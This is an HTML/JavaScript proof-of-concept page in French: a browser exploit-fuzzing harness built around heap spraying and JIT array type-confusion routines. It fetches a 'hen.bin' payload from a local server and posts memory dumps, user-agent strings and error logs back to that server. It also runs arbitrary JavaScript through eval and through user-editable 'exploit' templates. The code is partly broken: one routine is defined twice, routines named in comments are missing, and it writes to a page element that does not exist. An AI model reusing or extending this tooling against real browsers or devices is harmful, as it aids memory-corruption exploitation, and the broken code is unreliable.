<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>PoC Fullscreen Bug Avancé Complet</title>
  <style>
    body {
      background: #000;
      color: #0f0;  
      font-family: monospace;
      padding: 1em;
      margin: 0;
    }
    h1 {
      color: #0ff;
      margin-bottom: 10px;
    }
    pre, #log, #console, #stats, #errorLog {
      background: #111;
      padding: 10px;
      margin: 10px 0;
      height: 200px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-size: 13px;
      border-radius: 6px;
    }
    button, input, select {
      background: #111;
      color: #0ff;
      border: 1px solid #0ff;
      margin: 4px;
      padding: 6px 12px;
      cursor: pointer;
      border-radius: 4px;
      font-family: monospace;
      font-size: 13px;
    }
    #fuzzing {
      color: #ff0;
      font-weight: bold;
      margin: 10px 0;
    }
    #templates {
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
    }
    .template {
      background: #181818;
      padding: 10px;
      border-radius: 6px;
      margin-bottom: 15px;
    }
    .template textarea {
      width: 100%;
      height: 120px;
      background: #000;
      color: #0f0;
      font-family: monospace;
      font-size: 13px;
      border-radius: 4px;
      resize: vertical;
    }
    #stepbox {
      background: #181818;
      border-radius: 6px;
      margin-top: 10px;
      padding: 10px;
      font-size: 14px;
    }
    #stepbox button {
      margin-right: 8px;
    }
    #bufferView {
      background: #111;
      color: #0f0;
      font-family: monospace;
      margin-top: 15px;
      padding: 10px;
      height: 180px;
      overflow-x: auto;
      white-space: pre;
      border-radius: 6px;
    }
    .log-header {
      font-weight: bold;
      margin-bottom: 5px;
      color: #0ff;
    }
    #errorLog {
      color: #f66;
      font-weight: bold;
    }
  </style>
</head>
<body>

<h1>PoC Fullscreen Bug Avancé Complet</h1>

<!-- Contrôles principaux -->
<div>
  <button onclick="pingServeur()">Tester serveur</button>
  <button onclick="lancerRoutine()">Lancer routine</button>
  <button onclick="autoFuzz(10)">Auto-fuzz x10 (bloquant)</button>
  <button onclick="autoFuzz(50)">Auto-fuzz x50 (bloquant)</button>
  <button onclick="testerPayload()">Tester hen.bin</button>
  <button onclick="faireDump()">Envoyer dump mémoire</button>
  <button onclick="clearConsole()">Clear console</button>
  <button onclick="clearLog()">Clear log</button>
  <button onclick="clearErrorLog()">Clear erreurs</button>
  <button onclick="showBufferView()">Voir buffer spray</button>
</div>

<!-- Input JS -->
<div style="margin-top:15px;">
  JS: <input id="consoleInput" style="width:70%" placeholder="eval JS…">
  <button onclick="runConsole()">Exécuter</button>
</div>

<!-- Sélection & édition routines -->
<div style="margin-top:10px;">
  <label for="routineSelect">Choix Routine: </label>
  <select id="routineSelect"></select>
  <button onclick="runRoutine()">Run Routine</button>
  <button onclick="editRoutine()">Edit Routines</button>
  <button onclick="exportTemplates()">Exporter Templates</button>
  <button onclick="importTemplates()">Importer Templates</button>
</div>

<!-- Templates éditables -->
<div id="templates" style="display:none;">
  <h3>Routines personnalisées</h3>
  <div id="tplList"></div>
  <button onclick="addTemplate()">+ Ajouter template</button>
</div>

<!-- Fuzz pas à pas -->
<div id="stepbox" style="display:none;">
  <b>Fuzz Pas à Pas / Mutation contrôlée</b><br>
  <button onclick="mutationStep()">[➔ Mutation Step]</button>
  <button onclick="recordContext()">[Snapshot Context]</button>
  <button onclick="clearSteps()">[Clear Steps]</button>
  <span id="stepstatus"></span>
  <pre id="steplog" style="height:120px;"></pre>
</div>

<!-- Visualisation buffer spray -->
<div id="bufferView" style="display:none;"></div>

<!-- Logs -->
<div class="log-header">Logs généraux</div>
<pre id="log"></pre>

<div class="log-header">Console JS</div>
<pre id="console"></pre>

<div class="log-header">Erreurs JS</div>
<pre id="errorLog"></pre>

<div class="log-header">Stats</div>
<pre id="stats"></pre>

<div id="fuzzing"></div>

<script>
  // Constantes et config
  const URL_SERVEUR = "http://192.168.1.177:5000";
  const PAYLOAD_PATH = "/payload/hen.bin";
  const MOTIF = 0x43434343;
  const BASE_SPRAY = 60000;
  const MAX_SPRAY = 140000;
  const TAILLE_SPRAY = 16;
  const RUNTEMPLATES_KEY = "fuzz_templates";

  // État global
  let spray = [];
  let routines = {};
  let stats = {
    runs: 0,
    finds: 0,
    corrupts: [],
    startTime: Date.now(),
    maxSpray: 0,
    totalRuns: 0
  };
  let stepState = { victim: [], spray: [], n: 0 };
  let mutationStepLog = [];

  // --- Fonctions log et UI ---
  function log(...msg) {
    const logEl = document.getElementById("log");
    logEl.textContent += msg.join(" ") + "\n";
    logEl.scrollTop = logEl.scrollHeight;
    // Envoi log au serveur
    fetch(URL_SERVEUR + "/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ log: new Date().toISOString() + " " + msg.join(" ") })
    }).catch(() => {});
  }

  function term(...msg) {
    const consoleEl = document.getElementById("console");
    consoleEl.textContent += msg.join(" ") + "\n";
    consoleEl.scrollTop = consoleEl.scrollHeight;
  }

  function clearConsole() {
    document.getElementById("console").textContent = "";
  }

  function clearLog() {
    document.getElementById("log").textContent = "";
  }

  function clearErrorLog() {
    document.getElementById("errorLog").textContent = "";
  }

  function hex(n) {
    return "0x" + n.toString(16).padStart(8, "0");
  }

  // Afficher vue buffer spray
  function showBufferView() {
    const view = document.getElementById("bufferView");
    if (spray.length === 0) {
      view.textContent = "Aucun buffer spray à afficher.";
      view.style.display = "block";
      return;
    }
    let text = "";
    for (let i = 0; i < Math.min(100, spray.length); i++) {
      text += `[${i}] : ${Array.from(spray[i].u32).map(hex).join(" ")}\n`;
    }
    if (spray.length > 100) text += `... (${spray.length - 100} autres buffers non affichés)`;
    view.textContent = text;
    view.style.display = "block";
  }

  // --- Serveur ---
  function pingServeur() {
    fetch(URL_SERVEUR + "/logs")
      .then(() => term(" Serveur OK"))
      .catch(() => term("Serveur injoignable"));
  }

  function faireDump() {
    const dumpLimit = 50;
    let dumpText = spray
      .slice(0, dumpLimit)
      .map((b, i) => `[${i}] = ${Array.from(b.u32).map(hex).join(", ")}`)
      .join("\n");
    let header = `-- Dump manuel ${new Date().toISOString()} UA:${navigator.userAgent}\n`;
    fetch(URL_SERVEUR + "/dump", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ dump: header + dumpText + "\n[... tronqué ...]" }),
    });
    term(`Dump envoyé (${Math.min(spray.length, dumpLimit)} buffers)`);
    log("Dump manuel envoyé");
  }

  function testerPayload() {
    const t0 = performance.now();
    fetch(URL_SERVEUR + PAYLOAD_PATH)
      .then((r) => r.arrayBuffer())
      .then((buf) => {
        let dt = (performance.now() - t0).toFixed(1);
        term(`Payload reçu: ${buf.byteLength} octets en ${dt} ms`);
        log(`Payload reçu ${buf.byteLength} octets en ${dt} ms`);
      })
      .catch(() => {
        term("Payload non disponible sur le serveur");
        log("Erreur téléchargement payload");
      });
  }

  // --- Routines d'exploit ---

  routines["Routine de base"] = function (cfg) {
    spray = [];
    const sprayCount = cfg.spray;
    log(`▶ run#${stats.runs + 1} : création de ${sprayCount} buffers...`);
    for (let i = 0; i < sprayCount; i++) {
      const buf = new ArrayBuffer(TAILLE_SPRAY * 4);
      const u32 = new Uint32Array(buf);
      u32.fill(cfg.motif);
      spray.push({ u32 });
    }
    let victime = [1.1, 2.2, 3.3, 4.4];
    for (let i = 0; i < cfg.jit; i++) victime[1] = 5.5;
    victime.length = 1;
    victime[3] = 13.37;

    for (let i = 0; i < spray.length; i++) {
      const u = spray[i].u32;
      for (let j = 0; j < u.length; j++) {
        if (u[j] !== cfg.motif) {
          const ts = new Date().toISOString();
          const detail = `❗ CORRUPTION run#${stats.runs + 1} idx:${i} off:${j} val:${hex(
            u[j]
          )} TS:${ts}`;
          log(detail);
          term(detail);
          fetch(URL_SERVEUR + "/dump", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ dump: detail }),
          }).catch(() => {});
          stats.finds++;
          stats.corrupts.push(detail);
          return true;
        }
      }
    }
    log(`run#${stats.runs + 1} : pas de corruption détectée`);
    return false;
  };

  // ...juste après la routine Mutation Float Array...

  routines["JIT Array Type Confusion"] = function(cfg) {
    spray = [];
    for (let i = 0; i < cfg.spray; i++) {
      let buf = new ArrayBuffer(64);
      let u32 = new Uint32Array(buf);
      u32.fill(cfg.motif);
      spray.push({u32});
    }
    function confuse(arr, val) {
      arr[0] = 1.1;
      arr[1] = 2.2;
      arr[2] = 3.3;
      arr[3] = 4.4;
      for (let i = 0; i < 10000; i++) arr[0] = i;
      arr[0] = val;
      return arr;
    }
    let arr = [1.1, 2.2, 3.3, 4.4];
    confuse(arr, {});
    arr.length = 1;
    arr[10] = 13.37;
    // Vérifie la corruption
    for (let i = 0; i < spray.length; i++) {
      let u = spray[i].u32;
      for (let j = 0; j < u.length; j++) {
        if (u[j] !== cfg.motif) {
          stats.finds++;
          stats.corrupts.push(
            `[${stats.runs}] idx:${i} off:${j} val:${hex(u[j])}`
          );
          return true;
        }
      }
    }
    return false;
  };

  routines["Mutation Large Spray"] = function (cfg) {
    spray = [];
    const sprayCount = Math.min(cfg.spray * 1.5, MAX_SPRAY);
    for (let i = 0; i < sprayCount; i++) {
      const buf = new ArrayBuffer(128);
      const u32 = new Uint32Array(buf);
      for (let j = 0; j < u32.length; j++)
        u32[j] = j % 2 === 0 ? cfg.motif : ~cfg.motif;
      spray.push({ u32 });
    }
    let victim = [1.1, 2.2, 3.3, 4.4];
    for (let i = 0; i < cfg.jit * 3; i++) victim[1] = 6.6;
    victim.length = 3;
    victim[5] = 42.42;

    for (let i = 0; i < spray.length; i++) {
      const u = spray[i].u32;
      for (let j = 0; j < u.length; j++) {
        if (u[j] !== (j % 2 === 0 ? cfg.motif : ~cfg.motif)) {
          stats.finds++;
          stats.corrupts.push(
            `[${stats.runs}] idx:${i} off:${j} val:${hex(u[j])}`
          );
          return true;
        }
      }
    }
    return false;
  };

  // ...juste après la routine Heap Spray with Random Noise...

  routines["JIT Array Type Confusion"] = function(cfg) {
    spray = [];
    for (let i = 0; i < cfg.spray; i++) {
      let buf = new ArrayBuffer(64);
      let u32 = new Uint32Array(buf);
      u32.fill(cfg.motif);
      spray.push({u32});
    }
    function confuse(arr, val) {
      arr[0] = 1.1;
      arr[1] = 2.2;
      arr[2] = 3.3;
      arr[3] = 4.4;
      for (let i = 0; i < 10000; i++) arr[0] = i;
      arr[0] = val;
      return arr;
    }
    let arr = [1.1, 2.2, 3.3, 4.4];
    confuse(arr, {});
    arr.length = 1;
    arr[10] = 13.37;
    // Vérifie la corruption
    for (let i = 0; i < spray.length; i++) {
      let u = spray[i].u32;
      for (let j = 0; j < u.length; j++) {
        if (u[j] !== cfg.motif) {
          stats.finds++;
          stats.corrupts.push(
            `[${stats.runs}] idx:${i} off:${j} val:${hex(u[j])}`
          );
          return true;
        }
      }
    }
    return false;
  };

  // Exécution routine sélectionnée
  function runRoutine() {
    let sel = document.getElementById("routineSelect");
    let name = sel.value || "Routine de base";
    let routine = routines[name];
    let cfg = {
      spray: Math.min(BASE_SPRAY + stats.runs * 5000, MAX_SPRAY),
      motif: MOTIF,
      jit: 10000,
    };
    stats.runs++;
    stats.totalRuns++;
    let crashed = false;
    try {
      crashed = routine(cfg);
    } catch (e) {
      crashed = true;
      log("Routine Exception:", e);
    }
    if (crashed)
      term(`Crash/corruption détecté (run#${stats.runs})`);
    else term(`Pas de crash détecté (run#${stats.runs})`);
    showStats(); // <-- Correction ici : fonction bien définie en dessous
    return crashed;
  }

  // Alias pour bouton "Lancer routine"
  function lancerRoutine() {
    return runRoutine();
  }

  // Auto-fuzz bloquant
  function autoFuzz(nb = 10) {
    log(`Auto-fuzz bloquant x${nb}`);
    document.getElementById("fuzzing").textContent = "Fuzz en cours...";
    for (let i = 1; i <= nb; i++) {
      term(`🔍 Essai ${i} / ${nb}`);
      if (runRoutine()) {
        term(`Crash détecté à l'essai ${i}`);
        break;
      }
    }
    document.getElementById("fuzzing").textContent = "";
  }

  // Gestion erreurs JS
  window.onerror = function (msg, url, line, col, err) {
    const stack = err ? err.stack : "";
    const info = `[JS ERROR] ${msg} at ${url}:${line}:${col}\nStack: ${stack}`;
    log(info);
    const errorEl = document.getElementById("errorLog");
    errorEl.textContent += info + "\n";
    errorEl.scrollTop = errorEl.scrollHeight;
    fetch(URL_SERVEUR + "/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ log: info }),
    }).catch(() => {});
  };

  // Console JS simple
  function runConsole() {
    let v = document.getElementById("consoleInput").value;
    try {
      let r = eval(v);
      term(`▶ ${v}\n${r}`);
    } catch (e) {
      term(`✖ Erreur JS: ${e}`);
    }
  }

  // Templates
  function saveTemplates() {
    localStorage.setItem(
      RUNTEMPLATES_KEY,
      JSON.stringify(
        Object.entries(routines).filter(([k]) =>
          ![
            "Routine de base",
            "Mutation Float Array",
            "Mutation Large Spray",
            "Heap Spray with Random Noise",
          ].includes(k)
        )
      )
    );
  }

  function loadTemplates() {
    let raw = localStorage.getItem(RUNTEMPLATES_KEY);
    if (!raw) return;
    try {
      let arr = JSON.parse(raw);
      for (let [k, body] of arr) {
        routines[k] = new Function("cfg", body);
      }
    } catch (e) {
      log("Erreur chargement templates:", e);
    }
  }

  function renderTemplates() {
    let box = document.getElementById("tplList");
    box.innerHTML = "";
    for (let k in routines) {
      if (
        [
          "Routine de base",
          "Mutation Float Array",
          "Mutation Large Spray",
          "Heap Spray with Random Noise",
        ].includes(k)
      )
        continue;
      let tpl = document.createElement("div");
      tpl.className = "template";
      tpl.innerHTML = `<b>${k}</b><br>
        <textarea id="tpl_${k}">${routines[k]
          .toString()
          .replace(/^function[^{]+\{/, "")
          .replace(/\}$/, "")}</textarea>
        <button onclick="saveTemplate('${k}')">💾 Save</button>
        <button onclick="delTemplate('${k}')">❌ Delete</button>`;
      box.appendChild(tpl);
    }
  }

  function addTemplate() {
    let name = prompt("Nom du template JS (routine/exploit) :");
    if (!name) return;
    routines[name] = function (cfg) {
      /* code ici */
    };
    saveTemplates();
    renderTemplates();
    refreshRoutineList();
  }

  function saveTemplate(name) {
    let val = document.getElementById("tpl_" + name).value;
    routines[name] = new Function("cfg", val);
    saveTemplates();
    renderTemplates();
    refreshRoutineList();
  }

  function delTemplate(name) {
    if (confirm("Supprimer la routine " + name + " ?")) {
      delete routines[name];
      saveTemplates();
      renderTemplates();
      refreshRoutineList();
    }
  }

  function editRoutine() {
    renderTemplates();
    document.getElementById("templates").style.display = "block";
    document.getElementById("templates").scrollIntoView();
  }

  function refreshRoutineList() {
    let sel = document.getElementById("routineSelect");
    sel.innerHTML = "";
    for (let k in routines) {
      let opt = document.createElement("option");
      opt.value = k;
      opt.textContent = k;
      sel.appendChild(opt);
    }
  }

  // Step by Step mutation

  function mutationStep() {
    if (!stepState.victim.length) {
      stepState.victim = [1.1, 2.2, 3.3, 4.4];
      stepState.n = 0;
      stepState.spray = [];
      for (let i = 0; i < 2000; i++) {
        let buf = new ArrayBuffer(32);
        let u32 = new Uint32Array(buf);
        u32.fill(MOTIF);
        stepState.spray.push({ u32: u32 });
      }
    }
    stepState.n++;
    let idx = Math.floor(Math.random() * stepState.victim.length);
    let val = Math.random() * 10000;
    stepState.victim[idx] = val;
    if (Math.random() < 0.5)
      stepState.victim.length = 1 + Math.floor(Math.random() * 4);
    let info = `[STEP ${stepState.n}] Mutate victim[${idx}] = ${val.toFixed(
      2
    )} length=${stepState.victim.length}`;
    document.getElementById("stepstatus").textContent = info;
    mutationStepLog.push(info + " | victim=" + JSON.stringify(stepState.victim));
    document.getElementById("steplog").textContent = mutationStepLog
      .slice(-10)
      .join("\n");

    // Check corruption
    let corrupted = false;
    outer: for (let i = 0; i < stepState.spray.length; i++) {
      let u = stepState.spray[i].u32;
      for (let j = 0; j < u.length; j++) {
        if (u[j] !== MOTIF) {
          corrupted = true;
          log(`[STEP][!!!] Corruption détectée idx:${i} off:${j} val:${hex(u[j])}`);
          fetch(URL_SERVEUR + "/dump", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ dump: `[STEP] Corruption idx:${i} off:${j} val:${hex(u[j])}` }),
          });
          break outer;
        }
      }
    }
    document.getElementById("crash").textContent = corrupted
      ? "💥 Crash/corruption détecté lors du step !"
      : "";
  }

  function clearSteps() {
    mutationStepLog = [];
    document.getElementById("steplog").textContent = "";
    document.getElementById("crash").textContent = "";
    stepState = { victim: [], spray: [], n: 0 };
  }

  function recordContext() {
    let snap = `--- Snapshot step ${stepState.n} ---\nvictim: ${JSON.stringify(
      stepState.victim
    )}\nspray[0]: ${JSON.stringify(stepState.spray[0]?.u32)}\n`;
    mutationStepLog.push(snap);
    document.getElementById("steplog").textContent = mutationStepLog
      .slice(-10)
      .join("\n");
  }

  // Fonction affichage stats corrigée (ajoutée)
  function showStats() {
    const s = stats;
    const elapsed = ((Date.now() - s.startTime) / 1000).toFixed(1);
    document.getElementById("stats").textContent = `
Runs: ${s.runs}
Corruptions: ${s.finds}
Crashs détectés: ${s.corrupts.length}
Durée: ${elapsed}s
`;
  }

  // Initialisation
  window.onload = () => {
    loadTemplates();
    refreshRoutineList();
    renderTemplates();
    showStats();
  };
</script>

</body>
</html>
